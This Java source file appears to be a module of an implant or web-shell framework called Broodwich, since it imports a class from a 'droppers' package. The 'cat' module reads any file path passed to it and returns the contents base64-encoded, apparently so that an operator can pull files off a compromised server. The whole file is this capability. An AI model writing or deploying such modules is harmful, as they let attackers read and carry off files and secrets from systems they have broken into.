package party.itistimeto.broodwich.modules;

import party.itistimeto.broodwich.droppers.BroodwichFilter;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.List;

// add to docs: loads whole file into mem rather than writing to output stream

public class cat {
    public static String run(List<String> params) {
        // todo: add compression option
        if(params.size() > 0) {
            try {
                File f = new File(params.get(0));
                FileInputStream fis = new FileInputStream(f);
                int size = (int) f.length();
                byte[] out = new byte[size];
                fis.read(out, 0, size);
                return BroodwichFilter.encodeBase64(out);
            }
            catch (IOException e) {
                return e.getMessage();
            }
        }
        else {
            return "Please provide a path for a file to read.";
        }
    }
}
